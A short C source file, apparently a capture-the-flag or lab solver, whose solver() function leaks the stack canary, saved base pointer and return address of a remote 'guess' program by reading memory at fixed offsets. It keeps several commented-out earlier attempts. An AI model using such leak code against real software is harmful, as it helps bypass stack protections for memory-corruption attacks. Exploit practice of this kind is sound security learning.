#include <stdio.h>

typedef int (*printf_ptr_t)(const char *format, ...);

// void solver(printf_ptr_t fptr) {
// 	char msg[8] = {'A'};
// 	fptr("canary = %llx\n", *(unsigned long*)(msg+0x8));
// 	fptr("rbp = %llx\n", *(unsigned long*)(msg+0x10));
// 	fptr("return addr = %llx\n", *(unsigned long*)(msg+0x18)+0xab); //(msg+0x18) solver() return address, (msg+0x18)+0xab guess() return address(check on remoteguess.s)
// 	// for(unsigned long i = 0; i < 0x38; i+=0x8){
// 	// 	fptr("&fptr+%x: %p, val = %llx\n", i, (&fptr)+i, *(&fptr+i));
// 	// }
// }

void solver(printf_ptr_t fptr) {
	char msg[8] = {'A'};
	fptr("canary: %llx\nrbp: %llx\nreturn_addr: %llx\n", *((printf_ptr_t*)((void*)(&fptr)+0x10)), *((printf_ptr_t*)((void*)(&fptr)+0x18)), *((printf_ptr_t*)((void*)(&fptr)+0x20)));  
}

// void solver(printf_ptr_t fptr) {
// 	char buf[30];
// 	char msg1[30] = "canary: %llx\n";
// 	snprintf(buf, 30, msg1, *((printf_ptr_t*)((void*)(&fptr)+0x90)));
// 	fptr("buf= %s", buf);

// 	char msg2[35] = {'B'};
// 	snprintf(msg2, 35, "rbp: %llx\n", *((printf_ptr_t*)((void*)(&fptr)+0x98)));
// 	fptr("msg2 = %s", msg2);


// 	char msg3[35] = {'C'};
// 	snprintf(msg3, 35, "return_addr: %llx\n", *((printf_ptr_t*)((void*)(&fptr)+0x100)));
// 	fptr("msg3 = %s", msg3);

// }

// void solver(printf_ptr_t fptr) {
// 	fptr("hello\n");  
// }

int main() {
	char fmt[16] = "** main = %p\n";
	printf(fmt, main);
	solver(printf);
	return 0;
}